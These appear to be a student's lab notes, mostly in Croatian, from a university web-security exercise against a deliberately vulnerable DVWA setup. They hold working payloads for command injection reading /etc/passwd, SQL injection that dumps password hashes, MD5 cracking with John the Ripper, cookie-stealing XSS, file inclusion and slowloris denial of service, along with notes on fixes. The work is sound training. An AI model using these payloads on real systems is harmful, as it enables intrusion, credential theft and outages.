sudo dhclient -v eth2

wget http://public.tel.fer.hr/sui/zadatak4.tar.gz
tar xf zadatak4.tar.gz
cd zadatak4
sudo ./setup.bash

# Task 1
42 || cat /etc/passwd
# Kad ovo upišemo u bar, prva naredba (ping) završi s greškom te se zbog 'or'
# operatora izvršava sljedeća naredba

# Task 2
# input
# 6' UNION ALL SELECT first_name, password FROM users WHERE first_name='Pablo
echo "0d107d09f5bbe40cade3de5c71e9e9b7" > hashes.txt
sudo john --format=raw-md5 hashes.txt
# lozinka = letmein

# Task 3
# name = bilo kaj
# message = <script>alert(document.cookie);</script>
PHPSESSID=lsis52d8tedalatc7vrtdrdf16
http://public.tel.fer.hr/sui?cookie=security=low;%20PHPSESSID=lsis52d8tedalatc7vrtdrdf16
# sprjecavanje: počistiti HTML kod iz korisničkog unosa

# Task 4
# http://192.168.0.22/dvwa/vulnerabilities/fi/?page=/etc/passwd
# slika ti je u folderu
# to je moguće izvesti jer se ime datoteke uopće ne provjerava niti čisti. samo se napravi include te datoteke u source
# trebalo bi provjeravati putanju datoteke, ograničiti putanju na neki direktorij ili slično

# Task 5
# potrebno je desetak sekundi da server postane jako spor, oko pola minute da prestane odgovrati
# slowloris pokušava održati što je više moguće konekcija prema danom serveru. pokušava ih zadržati otvorene
# što je dulje moguće. To ostvaruje tako da otvori konekciju prema serveru i pošalje dio zahtjeva. S vremenom
# šalje preostale djelove HTTP zaglavlja, ali nikad ne pošalje zahtjev do kraja. Server će održavati ove konekcije
# otvorenim, popunit će maksimalni broj konekcija i s vremenom će prestati odg
